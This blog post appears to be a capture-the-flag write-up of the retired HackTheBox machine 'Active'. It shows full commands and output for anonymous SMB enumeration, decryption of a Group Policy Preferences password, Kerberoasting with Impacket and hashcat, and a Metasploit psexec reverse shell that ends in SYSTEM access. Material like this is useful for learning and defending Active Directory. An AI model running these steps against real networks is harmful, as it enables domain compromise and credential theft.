---
layout: post
title: HackTheBox - Active (Retired)
---

## Enumeration

Likely a Domain Controller since it's running DNS, Kerberos, LDAP. Domain: active.htb. Common to domain controllers message signing is enabled and required for smb. Most of SMB and NTLM relay is done on machines other than Domain Controller since the functionality is usually turned off.

We could maybe dump ldap information, but we typically won't have access to that without credentials. 445 and 139 are very interesting because SMB is behind a lot of exploits.

Let's try to list out the contents of the smb directory.
```
root@kali:~/Security/HackTheBox/active# smbclient -L \\\\10.10.10.100\\
Enter WORKGROUP\root's password: # just pressed enter
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```
Anonymous login is a finding. Absolutely list shares on a report. Let's see what we can connect to; the juiciest folders are C$ and ADMIN$.

```
root@kali:~/Security/HackTheBox/active# smbclient \\\\10.10.10.100\\ADMIN$
Enter WORKGROUP\root's password: 
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
root@kali:~/Security/HackTheBox/active# smbclient \\\\10.10.10.100\\C$
Enter WORKGROUP\root's password: 
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
root@kali:~/Security/HackTheBox/active# smbclient \\\\10.10.10.100\\IPC$
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ^C
root@kali:~/Security/HackTheBox/active# smbclient \\\\10.10.10.100\\NETLOGON
Enter WORKGROUP\root's password: 
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
root@kali:~/Security/HackTheBox/active# smbclient \\\\10.10.10.100\\Replication
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ^C
root@kali:~/Security/HackTheBox/active# smbclient \\\\10.10.10.100\\SYSVOL
Enter WORKGROUP\root's password: 
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
root@kali:~/Security/HackTheBox/active# smbclient \\\\10.10.10.100\\Users
Enter WORKGROUP\root's password: 
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```
We can connect to Replication and IPC$. Replication might be a backup of something. Let's `mget` everything in Replication.
```
root@kali:~/Security/HackTheBox/active# smbclient \\\\10.10.10.100\\Replication
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as GPE.INI (0.4 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as GptTmpl.inf (3.1 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.5 KiloBytes/sec) (average 1.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Registry.pol (9.4 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.1 KiloBytes/sec) (average 2.4 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as GptTmpl.inf (12.5 KiloBytes/sec) (average 3.8 KiloBytes/sec)
```
Groups.xml is promising. Let's `cat active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`.
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
Groups.xml is related to GPP (Group Policy Preferences). It allows Domain Admins to create Domain Policies using embedded credentials. We find: `userName="active.htb\SVC_TGS"` and `cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"`. `SVC_TGS` is the Ticket Granting Service. Groups.xml exists on some active domains, usually older ones. But, migrated ones may still have it. You can set one up as a honeypot though--a GPP that has never been used. As soon as credentials as used, you know there's a hacker on the network.

```
root@kali:~/Security/HackTheBox/active# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```
New creds - `active.htb:GPPstillStandingStrong2k18`.
We could try to push the creds around with `crackmapexec`. We could try to login to SMB with this account. We could use `psexec` on this machine. Another tactic is Kerberoasting.

### Kerberoasting
Kerberos: an authentication protocol using tickets to communicate and authenticate.

We have a server that is considered a KDC (Key Distribution Center). We also have another computer, the client. The client wants to authenticate, so it sends credentials and asks the server for a TGT (a ticket-granting ticket). KDC checks the creds and if they are good, sends back a secret key (encrypted by TGS) that's stored on the client until the ticket expires. There are also services (SQL, AntiVirus, etc) that the client might want to connect to. A service has a Service Principal Name (SPN). To connect as a client, we need to ask the KDC for permission. Client takes the ticket to KDC and asks to please connect to the service. With any valid ticket or TGT, we can request a TGS ticket for an SPN.

Impacket allows us to do this. Mine is located: /opt/impacket/examples/GetUserSPNs.py.
```
root@kali:~/Security/HackTheBox/active# cd /opt/impacket/examples/
root@kali:/opt/impacket/examples# python GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 -request
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

Password: # entered GPPstillStandingStrong2k18
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                  
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2018-07-30 13:17:40.656520 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$cfe6baaf6d9538cee9ab43897032e0fa$09198fe8a7f83682b4388efdc589cb1cda10227e9a60c7c35ea7d22c06d5a4bcda24ccaed5f93340a637fd28d7ccb66a72f389f5804de980f1994a7ff824ef17af26dd8c5c8a1c6d3455d0c7382b67d974316f7bf4b92f34a29f58a72b4379030b252d32db97ab5b11856163f11467818748522e3675dd450ba3aabbf50e48e1c4e30cbba5dc084f3d2c42046ce1a3479ec357f32dec622e2d53b0886dc80d9859cb884f5bde9ad9e04de3a5ea3fdf8ccbe85700be9d1482e6e8464432c72c3937d73a1d1a995e50551d7262f37449c04c646ebf4858ab7c9a2dc52cdcfad11dde4d1619edebee18b0720cd4d31a89183eee9ac7a271220ee5426150df7a13707dc6a87c8c9b5eb724b2c82d88b6bd291d32f2810f4739e2d2c85c5110438ccd638af22cf31cc3573f75c76bc3509e1ef8673850f1f6e5705d3eb562fce69bb0c14164ebada481efa673a48d03982b3e00aaec576abc5bbeb9f62aa10dbbe8db0457ad10a8dcd044ee16fe52f2982dc6b5209a6e21731183854f8f154202093a358c81aa374926a9bc4586511d2eb0cbb5e97a8128246b8c0fc25e10bb223caf955ef2d698c8b1b417e4586b5e023a223f977ec939a43e99506f582acca6310d465ec02562f76795bb9283e56cb3afc2eb6e6d035fedff593c385f0f55514499777141a01008b71b544bb94ea7bcbabb0576b4b668fd32ff7e83544d2ea00d9742ff25810d3b419afa77d132f4cc45cffe4c6ae87f0b39b0d8f4b9865745d731a70b1eeaf3dd5bae0003660e5eea6d9a905805080dd4918580a37245a50b8a5c2019c0134c727de350bcf4035efd6213e7ab3305023c725c4ec29299a04ef952564b2d380afb35a1f7f383fbe861068cfd5d45ce504991cb0084797505b5cd7ceb60f9901156964bea2c907c541d26dd379acec3ee27aa67d89dfdfa98c8833ccac102788ddbf9f01f29874b05f741f8a87ea5b7fd440da54e7c8f2938cb837ed800a917cff2ca69472a15227bf32e4ef0d95d20583d4bbf2f8650ade6ff94ba654a1e04c2ecfbd65e57e75e1f202b114effdad8d2c57cd30d5bc036749bcc55400cb4b18ccbd2529dd1c753f9da30cab6a87244d7b3217bad670e0417b4ad1c0eb1ca576ba963fdcb67adebe90df3697874ae19a990ce4b9a3e9ec0556cb74e0a4df654a583ea185c0dd1b41f175715a2f5b1ad2b60361885498f6645ba3f8a6309bf0085245092ef4edaa5fb6d67e6981045c657a0ce0f6104
```
We can try to crack this offline with `hashcat`. Save the hash into a file.

```
root@kali:~/Security/HackTheBox/active# cat hash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$cfe6baaf6d9538cee9ab43897032e0fa$09198fe8a7f83682b4388efdc589cb1cda10227e9a60c7c35ea7d22c06d5a4bcda24ccaed5f93340a637fd28d7ccb66a72f389f5804de980f1994a7ff824ef17af26dd8c5c8a1c6d3455d0c7382b67d974316f7bf4b92f34a29f58a72b4379030b252d32db97ab5b11856163f11467818748522e3675dd450ba3aabbf50e48e1c4e30cbba5dc084f3d2c42046ce1a3479ec357f32dec622e2d53b0886dc80d9859cb884f5bde9ad9e04de3a5ea3fdf8ccbe85700be9d1482e6e8464432c72c3937d73a1d1a995e50551d7262f37449c04c646ebf4858ab7c9a2dc52cdcfad11dde4d1619edebee18b0720cd4d31a89183eee9ac7a271220ee5426150df7a13707dc6a87c8c9b5eb724b2c82d88b6bd291d32f2810f4739e2d2c85c5110438ccd638af22cf31cc3573f75c76bc3509e1ef8673850f1f6e5705d3eb562fce69bb0c14164ebada481efa673a48d03982b3e00aaec576abc5bbeb9f62aa10dbbe8db0457ad10a8dcd044ee16fe52f2982dc6b5209a6e21731183854f8f154202093a358c81aa374926a9bc4586511d2eb0cbb5e97a8128246b8c0fc25e10bb223caf955ef2d698c8b1b417e4586b5e023a223f977ec939a43e99506f582acca6310d465ec02562f76795bb9283e56cb3afc2eb6e6d035fedff593c385f0f55514499777141a01008b71b544bb94ea7bcbabb0576b4b668fd32ff7e83544d2ea00d9742ff25810d3b419afa77d132f4cc45cffe4c6ae87f0b39b0d8f4b9865745d731a70b1eeaf3dd5bae0003660e5eea6d9a905805080dd4918580a37245a50b8a5c2019c0134c727de350bcf4035efd6213e7ab3305023c725c4ec29299a04ef952564b2d380afb35a1f7f383fbe861068cfd5d45ce504991cb0084797505b5cd7ceb60f9901156964bea2c907c541d26dd379acec3ee27aa67d89dfdfa98c8833ccac102788ddbf9f01f29874b05f741f8a87ea5b7fd440da54e7c8f2938cb837ed800a917cff2ca69472a15227bf32e4ef0d95d20583d4bbf2f8650ade6ff94ba654a1e04c2ecfbd65e57e75e1f202b114effdad8d2c57cd30d5bc036749bcc55400cb4b18ccbd2529dd1c753f9da30cab6a87244d7b3217bad670e0417b4ad1c0eb1ca576ba963fdcb67adebe90df3697874ae19a990ce4b9a3e9ec0556cb74e0a4df654a583ea185c0dd1b41f175715a2f5b1ad2b60361885498f6645ba3f8a6309bf0085245092ef4edaa5fb6d67e6981045c657a0ce0f6104

root@kali:~/Security/HackTheBox/active# hashcat --help | grep Kerberos
   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols

root@kali:~/Security/HackTheBox/active# hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
...
Ticketmaster1968
```
## Gaining Access
Now onto `psexec`.
```
msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.100
RHOSTS => 10.10.10.100
msf5 exploit(windows/smb/psexec) > set SMBDomain active.htb
SMBDomain => active.htb
msf5 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf5 exploit(windows/smb/psexec) > set SMBPass Ticketmaster1968
SMBPass => Ticketmaster1968
msf5 exploit(windows/smb/psexec) > run
...
[*] 10.10.10.100:445 - Selecting PowerShell target
...
[*] Exploit completed, but no session was created.
```
Let's try exploit targets other than automatic.
```
msf5 exploit(windows/smb/psexec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   PowerShell
   2   Native upload
   3   MOF upload


msf5 exploit(windows/smb/psexec) > set target 2
target => 2
msf5 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting   Required  Description
   ----                  ---------------   --------  -----------
   RHOSTS                10.10.10.100      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445               yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                     no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                    no        The service display name
   SERVICE_NAME                            no        The service name
   SHARE                 ADMIN$            yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             active.htb        no        The Windows domain to use for authentication
   SMBPass               Ticketmaster1968  no        The password for the specified username
   SMBUser               administrator     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > set LHOST 10.10.14.66
LHOST => 10.10.14.66
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.14.66:4444 
[*] 10.10.10.100:445 - Connecting to the server...
[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'administrator'...
[*] 10.10.10.100:445 - Selecting PowerShell target
[*] 10.10.10.100:445 - Executing the payload...
[+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (180291 bytes) to 10.10.10.100
[*] Meterpreter session 1 opened (10.10.14.66:4444 -> 10.10.10.100:57946) at 2020-09-01 22:33:05 -0400

meterpreter > sysinfo
Computer        : DC
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : el_GR
Domain          : ACTIVE
Logged On Users : 1
Meterpreter     : x86/windows

```
Okay, got the meterpreter session open but meterpreter is x86 and the machine is x64. Let's try this again with a different payload.
```
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.14.66:4444 
[*] 10.10.10.100:445 - Connecting to the server...
[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'administrator'...
[*] 10.10.10.100:445 - Uploading payload... NKFqsUot.exe
[*] 10.10.10.100:445 - Created \NKFqsUot.exe...
[+] 10.10.10.100:445 - Service started successfully...
[*] Sending stage (206403 bytes) to 10.10.10.100
[*] 10.10.10.100:445 - Deleting \NKFqsUot.exe...
[*] Meterpreter session 4 opened (10.10.14.66:4444 -> 10.10.10.100:57982) at 2020-09-01 22:40:44 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > shell
Process 1820 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>type C:\Users\SVC_TGS\Desktop\user.txt
type C:\Users\SVC_TGS\Desktop\user.txt
{censored}
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
{censored}
```
